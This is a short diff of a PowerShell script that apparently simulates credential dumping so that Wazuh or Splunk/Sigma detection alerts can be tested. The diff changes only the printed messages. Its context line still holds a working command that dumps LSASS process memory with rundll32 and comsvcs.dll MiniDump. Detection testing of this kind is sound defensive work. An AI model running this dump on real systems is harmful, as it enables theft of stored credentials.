@@ -11,4 +11,6 @@ $lsass = Get-Process lsass
 # This mimics a threat actor trying to steal credentials
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $lsass.id $env:TEMP\lsass.dmp full
 
-Write-Host "Attack Executed. Check Wazuh for Alert ID 100001." -ForegroundColor Green
+Write-Host "Attack Executed Successfully." -ForegroundColor Green
+Write-Host "-> If using Splunk/Sigma: Check for Triggered Alert 'Credential Dumping via comsvcs.dll MiniDump'." -ForegroundColor Yellow
+Write-Host "-> If using Wazuh: Check for Alert ID 100001." -ForegroundColor Yellow
